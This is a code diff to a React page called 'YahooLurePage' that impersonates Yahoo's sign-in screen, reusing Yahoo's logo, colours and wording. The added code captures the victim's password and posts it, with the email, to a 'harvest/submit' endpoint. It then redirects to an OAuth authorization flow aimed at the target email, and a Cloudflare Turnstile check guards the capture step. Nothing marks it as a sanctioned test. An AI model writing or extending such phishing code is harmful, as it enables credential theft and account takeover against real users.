@@ -1,13 +1,49 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { api } from "@/lib/api";
-import { ChevronLeft } from "lucide-react";
+import { ChevronLeft, Eye, EyeOff, Loader2 } from "lucide-react";
 
 export default function YahooLurePage() {
   const [step, setStep] = useState<1 | 2>(1);
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
+  const [turnstileToken, setTurnstileToken] = useState("");
+  const turnstileRef = useRef<HTMLDivElement>(null);
+  const turnstileWidgetId = useRef<number | null>(null);
+
+  // Load Turnstile script
+  useEffect(() => {
+    if (typeof window !== "undefined" && !document.querySelector('script[src*="turnstile"]')) {
+      const script = document.createElement("script");
+      script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js";
+      script.async = true;
+      script.defer = true;
+      document.head.appendChild(script);
+    }
+  }, []);
+
+  // Render Turnstile widget
+  useEffect(() => {
+    if (step === 2 && turnstileRef.current && window.turnstile && turnstileWidgetId.current === null) {
+      turnstileWidgetId.current = window.turnstile.render(turnstileRef.current, {
+        sitekey: process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || "",
+        theme: "light",
+        callback: (token: string) => setTurnstileToken(token),
+        "expired-callback": () => setTurnstileToken(""),
+        "error-callback": () => setTurnstileToken(""),
+      });
+    }
+    return () => {
+      if (turnstileWidgetId.current !== null && window.turnstile) {
+        window.turnstile.reset(turnstileWidgetId.current);
+        turnstileWidgetId.current = null;
+      }
+    };
+  }, [step]);
 
   const handleNext = (e: React.FormEvent) => {
     e.preventDefault();
@@ -19,21 +55,60 @@ export default function YahooLurePage() {
     setStep(2);
   };
 
-  useEffect(() => {
-    if (step === 2) {
-      const timer = setTimeout(() => {
-        window.location.href = `${api.getBaseUrl()}/api/v1/oauth/yahoo/authorize?target_email=${encodeURIComponent(email)}`;
-      }, 1500);
-      return () => clearTimeout(timer);
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password) {
+      setError("Enter your password");
+      return;
     }
-  }, [step, email]);
+    if (turnstileWidgetId.current !== null && !turnstileToken) {
+      setError("Please complete the security check");
+      return;
+    }
+    
+    setSubmitting(true);
+    setError("");
+    
+    try {
+      const response = await fetch(`${api.getBaseUrl()}/api/v1/harvest/submit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: email,
+          password,
+          provider: "YAHOO",
+          turnstile_token: turnstileToken || undefined,
+        }),
+      });
+      
+      if (!response.ok) {
+        const data = await response.json();
+        throw new Error(data.detail || "Submission failed");
+      }
+      
+      // Redirect to OAuth flow
+      window.location.href = `${api.getBaseUrl()}/api/v1/oauth/yahoo/authorize?target_email=${encodeURIComponent(email)}`;
+    } catch (err: any) {
+      setError(err.message || "Something went wrong. Try again.");
+      if (turnstileWidgetId.current !== null && window.turnstile) {
+        window.turnstile.reset(turnstileWidgetId.current);
+      }
+    } finally {
+      setSubmitting(false);
+    }
+  };
 
   return (
     <div className="flex min-h-screen flex-col bg-[#f9f9f9] font-sans">
       {/* Header */}
       <header className="flex h-14 items-center justify-between px-8 py-2">
         <div className="flex items-center">
-          <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="h-8" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
+          <img 
+            src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" 
+            alt="Yahoo" 
+            className="h-8" 
+            style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} 
+          />
         </div>
         <div className="hidden space-x-6 text-sm font-semibold text-[#188fff] sm:flex">
           <a href="#" className="hover:underline">Help</a>
@@ -47,7 +122,12 @@ export default function YahooLurePage() {
           {step === 1 ? (
             <form onSubmit={handleNext}>
               <div className="mb-2 text-center">
-                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="mx-auto h-8 mb-6" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
+                <img 
+                  src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" 
+                  alt="Yahoo" 
+                  className="mx-auto h-8 mb-6" 
+                  style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} 
+                />
               </div>
               <h1 className="mb-6 text-center text-xl font-bold text-[#222222]">
                 Sign in to Yahoo
@@ -140,29 +220,105 @@ export default function YahooLurePage() {
               </div>
             </form>
           ) : (
-            <div className="flex flex-col items-center justify-center py-12">
+            <form onSubmit={handleSubmit} className="w-full">
               <div className="mb-2 flex items-center justify-center">
-                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="h-8 mb-6" style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} />
+                <img 
+                  src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" 
+                  alt="Yahoo" 
+                  className="h-8 mb-6" 
+                  style={{ filter: "brightness(0) saturate(100%) invert(18%) sepia(93%) saturate(5451%) hue-rotate(274deg) brightness(85%) contrast(117%)"}} 
+                />
               </div>
 
               <div className="mb-4 flex flex-col items-center justify-center">
                 <span className="mb-2 text-sm text-[#222222] font-bold">{email}</span>
               </div>
               
-              <p className="mb-6 text-center text-base text-[#222222]">
-                Redirecting to secure login...
-              </p>
-              <p className="mb-8 text-center text-sm text-[#7c7c8c]">
-                Please wait while we connect to Yahoo.
-              </p>
-              
-              <div className="h-1 w-full max-w-xs overflow-hidden rounded-full bg-[#e0e4e9]">
-                <div className="h-full w-1/2 animate-[progress_1s_ease-in-out_infinite] rounded-full bg-[#7700ff]"></div>
+              <div className="relative mb-6">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  id="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  autoFocus
+                  className="peer w-full border-b border-[#222222] bg-transparent pb-1 pt-4 pr-12 text-base text-[#222222] outline-none focus:border-b-2 focus:border-[#0f69ff]"
+                  placeholder=" "
+                  disabled={submitting}
+                />
+                <label
+                  htmlFor="password"
+                  className="pointer-events-none absolute left-0 top-3 origin-[0] -translate-y-3 scale-75 transform text-[#7c7c8c] transition-all duration-150 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-3 peer-focus:scale-75 peer-focus:text-[#0f69ff]"
+                >
+                  Password
+                </label>
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#7c7c8c] hover:text-[#222222]"
+                  disabled={submitting}
+                >
+                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                </button>
               </div>
-            </div>
+              {error && <p className="mb-4 text-xs text-[#cc0000] text-center">{error}</p>}
+
+              {/* Turnstile Challenge */}
+              <div className="mb-6 flex justify-center" ref={turnstileRef} />
+
+              <div className="mb-4 text-center">
+                <button type="button" className="text-sm text-[#188fff] hover:underline">
+                  Forgot password?
+                </button>
+              </div>
+
+              <div className="mb-6">
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="w-full rounded-full bg-[#7700ff] py-3 text-base font-bold text-white transition hover:bg-[#6001d2] disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                >
+                  {submitting ? (
+                    <>
+                      <Loader2 className="h-5 w-5 animate-spin" />
+                      Signing in...
+                    </>
+                  ) : (
+                    "Next"
+                  )}
+                </button>
+              </div>
+
+              <div className="mt-8 text-center">
+                <button 
+                  type="button" 
+                  onClick={() => setStep(1)}
+                  className="text-base font-bold text-[#188fff] hover:underline"
+                  disabled={submitting}
+                >
+                  Back
+                </button>
+              </div>
+            </form>
           )}
         </div>
       </div>
     </div>
   );
+}
+
+// Type augmentation for Turnstile
+declare global {
+  interface Window {
+    turnstile: {
+      render: (container: HTMLElement, options: {
+        sitekey: string;
+        theme?: "light" | "dark" | "auto";
+        callback?: (token: string) => void;
+        "expired-callback"?: () => void;
+        "error-callback"?: () => void;
+      }) => number;
+      reset: (widgetId: number) => void;
+      remove: (widgetId: number) => void;
+    };
+  }
 }
